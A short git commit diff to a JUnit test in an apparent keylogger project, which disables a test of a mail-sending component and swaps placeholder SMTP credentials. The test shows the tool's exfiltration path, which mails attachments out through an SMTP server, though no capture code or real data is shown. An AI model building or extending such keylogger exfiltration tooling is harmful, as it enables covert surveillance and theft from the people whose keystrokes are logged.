5ac6cc33e625accc51e0e1d5e0b59dd2b0671ba0
kisonar <kisonar@wp.pl>
2022-08-30 15:38:05 +0200

    Tool update

--- tools/key-logger/src/test/java/com/mossad/keylogger/mail/MailSenderTest.java
+++ tools/key-logger/src/test/java/com/mossad/keylogger/mail/MailSenderTest.java
@@ -1,18 +1,20 @@
 package com.mossad.keylogger.mail;
 
 import org.apache.commons.mail.EmailException;
+import org.junit.jupiter.api.Disabled;
 import org.junit.jupiter.api.Test;
 
 import java.util.Collections;
 
 public class MailSenderTest {
 
+      @Disabled
       @Test
       public void sendEmail() throws EmailException {
             MailSender mailSender = new MailSender(
                     "smtp.wp.pl",
-                    "some-email@oooooo.pl",
-                    "some-password#", MailSender.SMTP_PORT);
+                    "someEmail",
+                    "somePassword", MailSender.SMTP_PORT);
             mailSender.prepareEmailWithAttqchment(Collections.emptyList());
             mailSender.send();
       }
